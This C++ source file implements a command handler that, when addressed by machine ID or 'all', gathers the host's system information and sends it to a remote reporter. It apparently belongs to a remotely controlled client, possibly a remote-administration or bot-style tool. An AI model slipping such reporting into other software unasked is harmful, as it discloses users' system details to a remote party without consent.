#include "application/commands/SysInfoHandler.hpp"

#include <algorithm>

namespace nuub::application::commands {

SysInfoHandler::SysInfoHandler(
    interfaces::ISysInfoService& sysinfo,
    interfaces::IReporter& reporter,
    std::string pc_id)
    : sysinfo_(sysinfo)
    , reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool SysInfoHandler::matches(const std::string& target) const {
    if (target.empty()) return true;
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

domain::Result<void> SysInfoHandler::handle_sysinfo(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    auto info = sysinfo_.get_system_info();
    reporter_.send_message(info);
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
